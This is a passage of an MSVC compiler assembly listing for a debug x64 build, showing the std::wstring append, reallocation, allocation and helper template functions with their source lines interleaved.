  0017c	4c 8b 45 68	 mov	 r8, QWORD PTR _Old_capacity$[rbp]
  00180	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR _Old_ptr$5[rbp]
  00187	48 8b 8d a8 00
	00 00		 mov	 rcx, QWORD PTR _Al$[rbp]
  0018e	e8 00 00 00 00	 call	 ?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity

; 4831 :             _My_data._Bx._Ptr = _New_ptr;

  00193	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  00197	48 8b 8d c8 00
	00 00		 mov	 rcx, QWORD PTR _New_ptr$[rbp]
  0019e	48 89 08	 mov	 QWORD PTR [rax], rcx

; 4832 :         } else {

  001a1	eb 49		 jmp	 SHORT $LN4@Reallocate
$LN3@Reallocate:

; 4833 :             _Fn(_Raw_new, _My_data._Bx._Buf, _Old_size, _Args...);

  001a3	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  001a7	48 8b 8d 20 02
	00 00		 mov	 rcx, QWORD PTR <_Args_1>$[rbp]
  001ae	48 89 4c 24 28	 mov	 QWORD PTR [rsp+40], rcx
  001b3	48 8b 8d 18 02
	00 00		 mov	 rcx, QWORD PTR <_Args_0>$[rbp]
  001ba	48 89 4c 24 20	 mov	 QWORD PTR [rsp+32], rcx
  001bf	4c 8b 4d 28	 mov	 r9, QWORD PTR _Old_size$[rbp]
  001c3	4c 8b c0	 mov	 r8, rax
  001c6	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _Raw_new$[rbp]
  001cd	48 8d 8d 10 02
	00 00		 lea	 rcx, QWORD PTR _Fn$[rbp]
  001d4	e8 00 00 00 00	 call	 ??R<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W0101@Z ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append'::`2'::<lambda_1>::operator()

; 4834 :             _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

  001d9	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  001dd	48 8d 95 c8 00
	00 00		 lea	 rdx, QWORD PTR _New_ptr$[rbp]
  001e4	48 8b c8	 mov	 rcx, rax
  001e7	e8 00 00 00 00	 call	 ??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
$LN4@Reallocate:

; 4835 :         }
; 4836 : 
; 4837 :         _ASAN_STRING_CREATE(*this);
; 4838 :         return *this;

  001ec	48 8b 85 00 02
	00 00		 mov	 rax, QWORD PTR this$[rbp]
$LN5@Reallocate:

; 4839 :     }

  001f3	48 8b f8	 mov	 rdi, rax
  001f6	48 8d 4d d0	 lea	 rcx, QWORD PTR [rbp-48]
  001fa	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z$rtcFrameData
  00201	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  00206	48 8b c7	 mov	 rax, rdi
  00209	48 8b 8d d8 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  00210	48 33 cd	 xor	 rcx, rbp
  00213	e8 00 00 00 00	 call	 __security_check_cookie
  00218	48 8d a5 e8 01
	00 00		 lea	 rsp, QWORD PTR [rbp+488]
  0021f	5f		 pop	 rdi
  00220	5d		 pop	 rbp
  00221	c3		 ret	 0
??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_grow_by<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append'::`2'::<lambda_1>,wchar_t const *,unsigned __int64>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??R<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W0101@Z
_TEXT	SEGMENT
$T1 = 196
this$ = 256
_New_ptr$ = 264
_Old_ptr$ = 272
_Old_size$ = 280
_Ptr$ = 288
_Count$ = 296
??R<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W0101@Z PROC ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append'::`2'::<lambda_1>::operator(), COMDAT

; 3319 :                 const size_type _Count) {

$LN3:
  00000	4c 89 4c 24 20	 mov	 QWORD PTR [rsp+32], r9
  00005	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  0000a	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000f	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00014	55		 push	 rbp
  00015	57		 push	 rdi
  00016	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0001d	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00022	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00029	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 3320 :                 _Traits::copy(_New_ptr, _Old_ptr, _Old_size);

  0002e	4c 8b 85 18 01
	00 00		 mov	 r8, QWORD PTR _Old_size$[rbp]
  00035	48 8b 95 10 01
	00 00		 mov	 rdx, QWORD PTR _Old_ptr$[rbp]
  0003c	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR _New_ptr$[rbp]
  00043	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy

; 3321 :                 _Traits::copy(_New_ptr + _Old_size, _Ptr, _Count);

  00048	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _New_ptr$[rbp]
  0004f	48 8b 8d 18 01
	00 00		 mov	 rcx, QWORD PTR _Old_size$[rbp]
  00056	48 8d 04 48	 lea	 rax, QWORD PTR [rax+rcx*2]
  0005a	4c 8b 85 28 01
	00 00		 mov	 r8, QWORD PTR _Count$[rbp]
  00061	48 8b 95 20 01
	00 00		 mov	 rdx, QWORD PTR _Ptr$[rbp]
  00068	48 8b c8	 mov	 rcx, rax
  0006b	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy

; 3322 :                 _Traits::assign(_New_ptr[_Old_size + _Count], _Elem());

  00070	33 c0		 xor	 eax, eax
  00072	66 89 85 c4 00
	00 00		 mov	 WORD PTR $T1[rbp], ax
  00079	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  00080	48 8b 8d 18 01
	00 00		 mov	 rcx, QWORD PTR _Old_size$[rbp]
  00087	48 03 c8	 add	 rcx, rax
  0008a	48 8b c1	 mov	 rax, rcx
  0008d	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR _New_ptr$[rbp]
  00094	48 8d 04 41	 lea	 rax, QWORD PTR [rcx+rax*2]
  00098	48 8d 95 c4 00
	00 00		 lea	 rdx, QWORD PTR $T1[rbp]
  0009f	48 8b c8	 mov	 rcx, rax
  000a2	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 3323 :             },

  000a7	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  000ae	5f		 pop	 rdi
  000af	5d		 pop	 rbp
  000b0	c3		 ret	 0
??R<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W0101@Z ENDP ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append'::`2'::<lambda_1>::operator()
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z
_TEXT	SEGMENT
_Val$ = 224
??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z PROC	; std::addressof<wchar_t *>, COMDAT

; 1583 : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__7C4A1519_type_traits
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1584 :     return __builtin_addressof(_Val);

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _Val$[rbp]

; 1585 : }

  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z ENDP	; std::addressof<wchar_t *>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z
_TEXT	SEGMENT
$T1 = 200
_Obj$ = 256
<_Args_0>$ = 264
??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z PROC ; std::_Construct_in_place<wchar_t *,wchar_t * const &>, COMDAT

; 248  :     is_nothrow_constructible_v<_Ty, _Types...>) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__C27AFEEB_xutility
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 249  : #if _HAS_CXX20
; 250  :     if (_STD is_constant_evaluated()) {
; 251  :         _STD construct_at(_STD addressof(_Obj), _STD forward<_Types>(_Args)...);
; 252  :     } else
; 253  : #endif // _HAS_CXX20
; 254  :     {
; 255  :         ::new (static_cast<void*>(_STD addressof(_Obj))) _Ty(_STD forward<_Types>(_Args)...);

  00024	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR _Obj$[rbp]
  0002b	e8 00 00 00 00	 call	 ??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z ; std::addressof<wchar_t *>
  00030	48 8b d0	 mov	 rdx, rax
  00033	b9 08 00 00 00	 mov	 ecx, 8
  00038	e8 00 00 00 00	 call	 ??2@YAPEAX_KPEAX@Z	; operator new
  0003d	48 89 85 c8 00
	00 00		 mov	 QWORD PTR $T1[rbp], rax
  00044	48 8b 85 c8 00
	00 00		 mov	 rax, QWORD PTR $T1[rbp]
  0004b	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR <_Args_0>$[rbp]
  00052	48 8b 09	 mov	 rcx, QWORD PTR [rcx]
  00055	48 89 08	 mov	 QWORD PTR [rax], rcx

; 256  :     }
; 257  : }

  00058	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0005f	5f		 pop	 rdi
  00060	5d		 pop	 rbp
  00061	c3		 ret	 0
??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ENDP ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z
_TEXT	SEGMENT
_Fancy_ptr$ = 8
_Al$ = 256
_Capacity$ = 264
??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>, COMDAT

; 2611 :     _NODISCARD static _CONSTEXPR20 pointer _Allocate_for_capacity(_Alty& _Al, size_type& _Capacity) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2612 :         _STL_INTERNAL_CHECK(_Capacity > _Small_string_capacity);
; 2613 :         ++_Capacity; // Take null terminator into consideration

  00024	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _Capacity$[rbp]
  0002b	48 8b 00	 mov	 rax, QWORD PTR [rax]
  0002e	48 ff c0	 inc	 rax
  00031	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR _Capacity$[rbp]
  00038	48 89 01	 mov	 QWORD PTR [rcx], rax

; 2614 : 
; 2615 :         pointer _Fancy_ptr;
; 2616 :         if constexpr (_Policy == _Allocation_policy::_At_least) {
; 2617 :             _Fancy_ptr = _Allocate_at_least_helper(_Al, _Capacity);

  0003b	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR _Capacity$[rbp]
  00042	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR _Al$[rbp]
  00049	e8 00 00 00 00	 call	 ??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >
  0004e	48 89 45 08	 mov	 QWORD PTR _Fancy_ptr$[rbp], rax

; 2618 :         } else {
; 2619 :             _STL_INTERNAL_STATIC_ASSERT(_Policy == _Allocation_policy::_Exactly);
; 2620 :             _Fancy_ptr = _Al.allocate(_Capacity);
; 2621 :         }
; 2622 : 
; 2623 : #if _HAS_CXX20
; 2624 :         // Start element lifetimes to avoid UB. This is a more general mechanism than _String_val::_Activate_SSO_buffer,
; 2625 :         // but likely more impactful to throughput.
; 2626 :         if (_STD is_constant_evaluated()) {
; 2627 :             _Elem* const _Ptr = _Unfancy(_Fancy_ptr);
; 2628 :             for (size_type _Idx = 0; _Idx < _Capacity; ++_Idx) {
; 2629 :                 _STD construct_at(_Ptr + _Idx);
; 2630 :             }
; 2631 :         }
; 2632 : #endif // _HAS_CXX20
; 2633 :         --_Capacity;

  00052	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _Capacity$[rbp]
  00059	48 8b 00	 mov	 rax, QWORD PTR [rax]
  0005c	48 ff c8	 dec	 rax
  0005f	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR _Capacity$[rbp]
  00066	48 89 01	 mov	 QWORD PTR [rcx], rax

; 2634 :         return _Fancy_ptr;

  00069	48 8b 45 08	 mov	 rax, QWORD PTR _Fancy_ptr$[rbp]

; 2635 :     }

  0006d	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00074	5f		 pop	 rdi
  00075	5d		 pop	 rbp
  00076	c3		 ret	 0
??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
;	COMDAT ??$min@_K@std@@YAAEB_KAEB_K0@Z
_TEXT	SEGMENT
$T1 = 200
tv65 = 216
_Left$ = 256
_Right$ = 264
??$min@_K@std@@YAAEB_KAEB_K0@Z PROC			; std::min<unsigned __int64>, COMDAT

; 98   :     (min) (const _Ty& _Left, const _Ty& _Right) noexcept(noexcept(_Right < _Left)) /* strengthened */ {

$LN5:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__2F328FEB_utility
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 99   :     // return smaller of _Left and _Right
; 100  :     return _Right < _Left ? _Right : _Left;

  00024	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _Right$[rbp]
  0002b	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR _Left$[rbp]
  00032	48 8b 09	 mov	 rcx, QWORD PTR [rcx]
  00035	48 39 08	 cmp	 QWORD PTR [rax], rcx
  00038	73 10		 jae	 SHORT $LN3@min
  0003a	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _Right$[rbp]
  00041	48 89 85 d8 00
	00 00		 mov	 QWORD PTR tv65[rbp], rax
  00048	eb 0e		 jmp	 SHORT $LN4@min
$LN3@min:
  0004a	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR _Left$[rbp]
  00051	48 89 85 d8 00
	00 00		 mov	 QWORD PTR tv65[rbp], rax
$LN4@min:
  00058	48 8b 85 d8 00
	00 00		 mov	 rax, QWORD PTR tv65[rbp]
  0005f	48 89 85 c8 00
	00 00		 mov	 QWORD PTR $T1[rbp], rax
  00066	48 8b 85 c8 00
	00 00		 mov	 rax, QWORD PTR $T1[rbp]

; 101  : }

  0006d	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00074	5f		 pop	 rdi
  00075	5d		 pop	 rbp
  00076	c3		 ret	 0
??$min@_K@std@@YAAEB_KAEB_K0@Z ENDP			; std::min<unsigned __int64>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z
_TEXT	SEGMENT
_Ptr$ = 224
_Bytes$ = 232
??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z PROC		; std::_Deallocate<16,0>, COMDAT

; 255  : _CONSTEXPR20 void _Deallocate(void* _Ptr, size_t _Bytes) noexcept {

$LN4:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 256  :     // deallocate storage allocated by _Allocate when !_HAS_ALIGNED_NEW || _Align <= __STDCPP_DEFAULT_NEW_ALIGNMENT__
; 257  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 258  :     if (_STD is_constant_evaluated()) {
; 259  :         ::operator delete(_Ptr);
; 260  :     } else
; 261  : #endif // _HAS_CXX20
; 262  :     {
; 263  : #if defined(_M_IX86) || defined(_M_X64)
; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00024	48 81 bd e8 00
	00 00 00 10 00
	00		 cmp	 QWORD PTR _Bytes$[rbp], 4096 ; 00001000H
  0002f	72 13		 jb	 SHORT $LN2@Deallocate

; 265  :             _Adjust_manually_vector_aligned(_Ptr, _Bytes);

  00031	48 8d 95 e8 00
	00 00		 lea	 rdx, QWORD PTR _Bytes$[rbp]
  00038	48 8d 8d e0 00
	00 00		 lea	 rcx, QWORD PTR _Ptr$[rbp]
  0003f	e8 00 00 00 00	 call	 ?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z ; std::_Adjust_manually_vector_aligned
$LN2@Deallocate:

; 266  :         }
; 267  : #endif // defined(_M_IX86) || defined(_M_X64)
; 268  :         ::operator delete(_Ptr, _Bytes);

  00044	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _Bytes$[rbp]
  0004b	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Ptr$[rbp]
  00052	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete

; 269  :     }
; 270  : }

  00057	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0005e	5f		 pop	 rdi
  0005f	5d		 pop	 rbp
  00060	c3		 ret	 0
??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z ENDP		; std::_Deallocate<16,0>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
;	COMDAT ??$max@_K@std@@YAAEB_KAEB_K0@Z
_TEXT	SEGMENT
$T1 = 200
tv65 = 216
_Left$ = 256
_Right$ = 264
??$max@_K@std@@YAAEB_KAEB_K0@Z PROC			; std::max<unsigned __int64>, COMDAT

; 75   :     (max) (const _Ty& _Left, const _Ty& _Right) noexcept(noexcept(_Left < _Right)) /* strengthened */ {

$LN5:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__2F328FEB_utility
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 76   :     // return larger of _Left and _Right
; 77   :     return _Left < _Right ? _Right : _Left;

  00024	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR _Left$[rbp]
  0002b	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR _Right$[rbp]
  00032	48 8b 09	 mov	 rcx, QWORD PTR [rcx]
  00035	48 39 08	 cmp	 QWORD PTR [rax], rcx
  00038	73 10		 jae	 SHORT $LN3@max
  0003a	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _Right$[rbp]
  00041	48 89 85 d8 00
	00 00		 mov	 QWORD PTR tv65[rbp], rax
  00048	eb 0e		 jmp	 SHORT $LN4@max
$LN3@max:
  0004a	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR _Left$[rbp]
  00051	48 89 85 d8 00
	00 00		 mov	 QWORD PTR tv65[rbp], rax
$LN4@max:
  00058	48 8b 85 d8 00
	00 00		 mov	 rax, QWORD PTR tv65[rbp]
  0005f	48 89 85 c8 00
	00 00		 mov	 QWORD PTR $T1[rbp], rax
  00066	48 8b 85 c8 00
	00 00		 mov	 rax, QWORD PTR $T1[rbp]

; 78   : }

  0006d	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00074	5f		 pop	 rdi
  00075	5d		 pop	 rbp
  00076	c3		 ret	 0
??$max@_K@std@@YAAEB_KAEB_K0@Z ENDP			; std::max<unsigned __int64>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z
_TEXT	SEGMENT
_Obj$ = 224
??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z PROC	; std::_Destroy_in_place<wchar_t *>, COMDAT

; 307  : _CONSTEXPR20 void _Destroy_in_place(_Ty& _Obj) noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 308  :     if constexpr (is_array_v<_Ty>) {
; 309  :         _Destroy_range(_Obj, _Obj + extent_v<_Ty>);
; 310  :     } else {
; 311  :         _Obj.~_Ty();
; 312  :     }
; 313  : }

  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z ENDP	; std::_Destroy_in_place<wchar_t *>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z
_TEXT	SEGMENT
_Ptr$ = 224
??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z PROC			; std::_Unfancy<wchar_t>, COMDAT

; 35   : _NODISCARD constexpr _Ty* _Unfancy(_Ty* _Ptr) noexcept { // do nothing for plain pointers

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 36   :     return _Ptr;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _Ptr$[rbp]

; 37   : }

  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ENDP			; std::_Unfancy<wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$_Construct_in_place@PEA_WAEAPEA_W@std@@YAXAEAPEA_W0@Z
_TEXT	SEGMENT
$T1 = 200
_Obj$ = 256
<_Args_0>$ = 264
??$_Construct_in_place@PEA_WAEAPEA_W@std@@YAXAEAPEA_W0@Z PROC ; std::_Construct_in_place<wchar_t *,wchar_t * &>, COMDAT

; 248  :     is_nothrow_constructible_v<_Ty, _Types...>) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__C27AFEEB_xutility
